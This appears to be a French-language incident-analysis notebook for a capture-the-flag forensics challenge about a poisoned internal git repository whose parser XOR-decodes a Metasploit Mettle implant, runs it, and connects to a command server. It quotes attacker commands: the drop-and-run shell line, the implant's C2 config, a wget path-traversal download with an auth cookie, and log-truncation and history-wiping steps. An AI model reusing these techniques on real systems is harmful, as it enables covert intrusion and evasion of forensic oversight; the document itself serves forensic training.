# Poisoned Branch — Sherlock 05 "Backdoored Repository and Exposed Server" — analysis state

## Artifacts
- `artifacts/Tom/home/Tom/` : snapshot du home de Tom (contient .cache/.ticket-parser/.integrity = le vrai binaire)
- `artifacts/uac_output/uac-LT-TAinsworth-linux-20260915155349/` : collecte UAC 3.3.0 (live response) du 2026-09-15 15:53
  - `[root]/…` filesystem, `live_response/{network,process,system,packages}`, `uac.log`
  - note: l'image UAC n'a PAS le `.cache`/`Work_Stuff` (capture partielle) ; l'artefact `Tom/` oui
- PDF d'énoncé: "Holmes CTF 2026 - Sherlock 05 - Backdoored Repository and Exposed Server.pdf" (Chapter 06 — The False Employee)

## Persona / faux employé
- Account local: `Tom:x:1000:1000` avec GECOS `felamos` (renommé via `usermod -l Tom felamos`, `groupmod -n Tom felamos`, `usermod -aG sudo Tom`, `sudo nano /etc/passwd`)
- `sudoers.d/felamos` : `felamos ALL=(ALL:ALL) NOPASSWD:ALL`
- `Documents/resume.txt` : "Goooogle 2018-2024 … gather data on every individual in the world" (indice que Tom Ainsworth = l'attaque du faux employé)
- `Work_Stuff/ONBOARDING/{WELCOME.txt, Official_GOV.txt}` ; le PDF **`Gov_HR_Continuity_Emergency_Callout_Roster.pdf` a été supprimé par l'attaquant** (`rm ...` cwd=/home/Tom/Work_Stuff/ONBOARDING ; ça = données HR)

## Repos
- légitimes (GitHub) : csvtomd (mplewis), duckdb, json-to-csv (vinay20045), dlt (dlt-hub) — clones --depth 1
- internes (forge « devforge.internal:3000 », des logins git à la Gitea/Forgejo):
  - `diogenes/diogenes-breakroom-roster.git` -> CLEAN (appli HR du "developer contractor")
  - `diogenes/diogenes-ticket-parser.git` -> **EMPOISONNÉ**
- origine / commit ticket-parser:
  - remote: `http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git`
  - commit unique `81d8e74` "Initial project import", auteur **Sebastain Moran <cbass.Moran@blackpearl2026.htb>** 2026-09-11T16:05:06+01:00 (faux nom — cf. Colonel Sebastian Moran)
  - version 1.3.3.7 (leetspeak)
- ticket_parser.py -> `src/ticket_parser/telemetry.py::validate_environment()` :
  - lit `diogenes.jpg` (33892B) + `calibration.bin` (1138480B), **XOR clé répétée** (le plus court = clé), résultat (1138480B) = ELF, écrit `~/.cache/.ticket-parser/.integrity`, `chmod +x`, puis lance `... 2>&1 &`
  - noms en base64: `.cache`=`LmNhY2hl`, `.ticket-parser`=`LnRpY2tldC1wYXJzZXI=`, `.integrity`=`LmludGVncml0eQ==`

## Payload = Mettle/Metasploit stage
- binaire reconstruit + copie artefact: sha256 `f925caffe2310ae74ac936b78c0fd5d64b249a5be57e73c28ee6b262e5d44c79`
- ELF 64-bit LSB pie executable x86-64, static-pie, mbedtls + libcurl + libssh (module PARASSH), debug_info (non strippé)
- ligne de config embarquée:
  `mettle -U "DZX5O4OdQwxuIGgiBIR4cA==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "tcp://blackpearl2026.htb:31337" -d "0" -o "" -b "0"`
  - UUID = DZX5O4OdQwxuIGgiBIR4cA== ; transport group = AAAAAAAAAAAAAAAAAAAAAA==
  - C2: tcp://blackpearl2026.htb:31337  == **203.0.113.10:31337**
- drop+run confirmé dans le journal audit (EXECVE):
  `python3 ticket_parser.py` -> `/bin/sh -c chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &`
- au moment de la collecte: PID 1514 `/home/Tom/.cache/.ticket-parser/.integrity` (uid 1000, etime 33:29), **connection unique** :
  `.integrity` fd=4 -> TCP ESTAB `192.168.0.21:50878 -> 203.0.113.10:31337` (ss/lsof/proc_net_tcp)
- aucun réseau autre : sshd LISTEN *:22 ; pas de persistance cron/systemd (le stage se lance à l'exécution du parser)

## authorized_keys / accès à distance (post-compromission)
- `.ssh/authorized_keys` (742B, daté 10-09 17:18) = clé RSA commentée `moran@BlackPearl` (SEUL fichier dans .ssh)
- récupéré via le **serveur exposé BlackPearl** (audité, EXECVE) :
  `wget -q --header="Cookie: X-Operator-Auth=napoleon_moran_1894" -O authorized_keys http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub`
  puis version IP : `http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub`
  => **path traversal (LFI) dans /download** sur le port 9999 du serveur exposé ; auth = cookie `X-Operator-Auth=napoleon_moran_1894`

## Historique/reseau (journal audit)
- auditd installé (dpkg 10-09 21:57 ; log audit.log **tronqué par l'attaquant** : `truncate -s 0 /var/log/audit/audit.log`, puis auditd relancé/enable) -> le journal systemd a gardé l'historique des USER_CMD/EXECVE
- attaquant au clavier: `sudo nano /etc/passwd`, `/etc/hosts`, `hostnamectl set-hostname LT-TAinsworth`, `git clone …`, `chown -R Tom:Tom Work_Stuff/`, `rm Gov_HR_...Roster.pdf`, `rm .bash_history`, `ln .bash_history → dev/null`
- réseau : la VM avait 2 cartes (eth0 lan 192.168.0.21 ; eth1 testnet 198.51.100.21/24), DNS nameserver = 198.51.100.1
- tentative sshd (faille d'auth) depuis `rhost=198.51.100.1` Sep 10 19:28:07 (user unknown)
- SSH (externe) prévu via authorized_keys plantée (PubkeyAuthentication par défaut) ; pas de private key/known_hosts dans .ssh

## Récap narrative pour les questions
1. Repo empoisonné = diogenes-ticket-parser (devforge.internal:3000, auteur cbass.Moran@blackpearl2026.htb)
2. Il installe = stage mettle `.integrity` (XOR image+calibration) -> C2 blackpearl2026.htb:31337 (203.0.113.10)
3. « How far had the intruder travelled? » = depuis la VM, il a (a) backdoor SSH via authorized_keys (LFI path traversal sur serveur exposé BlackPearl:9999 /download, cookie X-Operator-Auth=napoleon_moran_1894), (b) supprimé le PDF HR Gov_HR_..._Roster.pdf, (c) garde un RAT connecté à 203.0.113.10:31337
4. Serveur exposé = BlackPearl2026.htb (203.0.113.10), ports 31337 (C2 mettle) + 9999 (web /download avec traversal)

## À faire
- [ ] analyser le binaire `.integrity` en détail (strings, sections, PARASSH) si questions précises
- [ ] regarder stash.log/audit complet pour dates exactes réussite/défaillance (journal systemd, ordre déjà extrait dans exploration)
- [ ] répondre aux questions plateforme (pas encore fournies)
- [ ] possible: base64 UUID non standard (mettle -U base64url ?) — vérifier si demandé